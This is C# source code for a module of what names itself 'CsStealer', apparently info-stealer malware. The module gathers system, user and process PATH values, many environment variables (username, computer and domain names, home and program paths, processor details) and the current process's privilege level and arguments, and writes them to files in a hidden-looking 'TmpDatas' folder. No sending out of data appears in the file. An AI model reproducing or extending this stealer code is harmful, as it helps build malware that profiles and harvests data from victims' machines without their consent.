using System;
using System.Text;
using System.Diagnostics;

namespace CsStealer
{
    public class OthersAdvanced
    {

        public static string OutputDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "TmpDatas", "System", "Advanced & Developer");

        public static void GetSystemPath()
        {
            string OutF = Path.Combine(OutputDir, "Environment Variables.txt");
            string RawVarContent = Environment.GetEnvironmentVariable("PATH", EnvironmentVariableTarget.Machine);

            string FormattedVarContent;

            if (!string.IsNullOrEmpty(RawVarContent))
            {
                StringBuilder sb = new StringBuilder();

                sb.AppendLine("\n[ SYSTEM PATH ]\n");

                foreach (string _Path in RawVarContent.Split(";"))
                {
                    sb.AppendLine($"    - {_Path}");
                }

                sb.AppendLine("\n");

                FormattedVarContent = sb.ToString();
            }
            else
            {
                FormattedVarContent = "\n[ SYSTEM PATH ]\n\n--\n\n";
            }

            if (!File.Exists(OutF)) File.WriteAllText(OutF, FormattedVarContent);
            else File.AppendAllText(OutF, FormattedVarContent);
        }

        public static void GetUserPath()
        {
            string OutF = Path.Combine(OutputDir, "Environment Variables.txt");
            string RawVarContent = Environment.GetEnvironmentVariable("PATH", EnvironmentVariableTarget.User);

            string FormattedVarContent;

            if (!string.IsNullOrEmpty(RawVarContent))
            {
                StringBuilder sb = new StringBuilder();

                sb.AppendLine("\n[ USER PATH ]\n");

                foreach (string _Path in RawVarContent.Split(";"))
                {
                    sb.AppendLine($"    - {_Path}");
                }

                sb.AppendLine("\n");

                FormattedVarContent = sb.ToString();
            }
            else
            {
                FormattedVarContent = "\n[ USER PATH ]\n\n--\n\n";
            }


            if (!File.Exists(OutF)) File.WriteAllText(OutF, FormattedVarContent);
            else File.AppendAllText(OutF, FormattedVarContent);
        }

        public static void GetProcessPath()
        {
            string OutF = Path.Combine(OutputDir, "Environment Variables.txt");
            string RawVarContent = Environment.GetEnvironmentVariable("PATH", EnvironmentVariableTarget.Process);

            string FormattedVarContent;

            if (!string.IsNullOrEmpty(RawVarContent))
            {
                StringBuilder sb = new StringBuilder();

                sb.AppendLine("\n[ CURRENT PROCESS PATH ]\n");

                foreach (string _Path in RawVarContent.Split(";"))
                {
                    sb.AppendLine($"    - {_Path}");
                }

                sb.AppendLine("\n");

                FormattedVarContent = sb.ToString();
            }
            else
            {
                FormattedVarContent = "\n[ CURRENT PROCESS PATH ]\n\n--\n\n";
            }


            if (!File.Exists(OutF)) File.WriteAllText(OutF, FormattedVarContent);
            else File.AppendAllText(OutF, FormattedVarContent);
        }

        public static void GetPathesVars()
        {
            string OutF = Path.Combine(OutputDir, "Environment Variables.txt");
            Dictionary<string, string?> VarsDict = new Dictionary<string, string?>(StringComparer.OrdinalIgnoreCase)
        {
            {"%userprofile%", Environment.GetEnvironmentVariable("userprofile")},
            {"%appdata%", Environment.GetEnvironmentVariable("appdata")},
            {"%localappdata%", Environment.GetEnvironmentVariable("localappdata")},
            {"%temp%", Environment.GetEnvironmentVariable("temp")},
            {"%tmp%", Environment.GetEnvironmentVariable("tmp")},
            {"%windir%", Environment.GetEnvironmentVariable("windir")},
            {"%systemroot%", Environment.GetEnvironmentVariable("systemroot")},
            {"%username%", Environment.GetEnvironmentVariable("username")},
            {"%userdomain%", Environment.GetEnvironmentVariable("userdomain")},
            {"%computername%", Environment.GetEnvironmentVariable("computername")},
            {"%homedrive%", Environment.GetEnvironmentVariable("homedrive")},
            {"%homepath%", Environment.GetEnvironmentVariable("homepath")},
            {"%homeshare%", Environment.GetEnvironmentVariable("homeshare")},
            {"%programfiles%", Environment.GetEnvironmentVariable("programfiles")},
            {"%programfiles(x86)%", Environment.GetEnvironmentVariable("programfiles(x86)")},
            {"%commonprogramfiles%", Environment.GetEnvironmentVariable("commonprogramfiles")},
            {"%commonprogramfiles(x86)%", Environment.GetEnvironmentVariable("commonprogramfiles(x86)")},
            {"%programdata%", Environment.GetEnvironmentVariable("programdata")},
            {"%public%", Environment.GetEnvironmentVariable("public")},
            {"%allusersprofile%", Environment.GetEnvironmentVariable("allusersprofile")},
            {"%path%", Environment.GetEnvironmentVariable("path")},
            {"%pathext%", Environment.GetEnvironmentVariable("pathext")},
            {"%processor_architecture%", Environment.GetEnvironmentVariable("processor_architecture")},
            {"%processor_identifier%", Environment.GetEnvironmentVariable("processor_identifier")},
            {"%number_of_processors%", Environment.GetEnvironmentVariable("number_of_processors")},
            {"%sessionname%", Environment.GetEnvironmentVariable("sessionname") }
        };

            StringBuilder sb = new StringBuilder();

            sb.AppendLine("\n[ ENVIRONMENT VARIABLES ]\n");

            foreach (KeyValuePair<string, string?> Pair in VarsDict)
            {
                string VarName = Pair.Key;
                string? VarValue = Pair.Value;

                if (string.IsNullOrEmpty(VarValue))
                {
                    VarValue = "--";
                }

                sb.AppendLine($"{VarName}    =>    {VarValue}");
            }

            sb.AppendLine("");

            if (!File.Exists(OutF)) File.WriteAllText(OutF, sb.ToString());
            else File.AppendAllText(OutF, sb.ToString());
        }

        public static void GetCurrentPorcessInfo(string[] Args)
        {
            string OutF = Path.Combine(OutputDir, "Current Process.txt");
            Process CurrentProcess = Process.GetCurrentProcess();

            string Privilege = "User";

            if (Environment.IsPrivilegedProcess) Privilege = "Administrator";

            StringBuilder sb = new StringBuilder();

            sb.AppendLine("");
            sb.AppendLine("[ CURRENT PROCESS INFOS ]\n");
            sb.AppendLine("Basics :");
            sb.AppendLine($"  Name      : {CurrentProcess.ProcessName}");
            sb.AppendLine($"  PID       : {CurrentProcess.Id}");
            sb.AppendLine($"  Privilege :  {Privilege}");
            sb.AppendLine($"\nStartInfos : ");
            sb.AppendLine($"  FileName : {CurrentProcess.StartInfo.FileName}");
            sb.AppendLine($"  Arguments : {string.Join(" | ", Args)}");
            sb.AppendLine($"File :");
            sb.AppendLine($"  Base Directory : {AppDomain.CurrentDomain.BaseDirectory}");
            File.WriteAllText(OutF, sb.ToString());
        }
    }
}